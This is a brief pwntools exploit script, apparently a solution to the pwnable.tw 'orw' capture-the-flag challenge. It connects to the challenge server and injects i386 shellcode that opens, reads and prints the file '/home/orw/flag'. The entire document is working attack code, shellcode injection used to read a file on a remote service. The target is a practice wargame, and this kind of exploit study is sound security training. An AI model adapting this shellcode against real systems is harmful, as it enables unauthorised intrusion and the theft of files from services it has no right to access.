#!/usr/bin/env python2 

from pwn import *
import pwnlib.shellcraft

p = remote('chall.pwnable.tw', 10001)

context.log_level = 'debug'

shellcode = shellcraft.i386.pushstr('/home/orw/flag')
shellcode += shellcraft.i386.linux.syscall('SYS_open', 'esp')
shellcode += shellcraft.i386.linux.syscall('SYS_read', 'eax', 'esp', 0x50)
shellcode += shellcraft.i386.linux.syscall('SYS_write', 1, 'esp', 0x50)

p.sendlineafter('Give my your shellcode:', asm(shellcode))

print p.recv()

p.close()

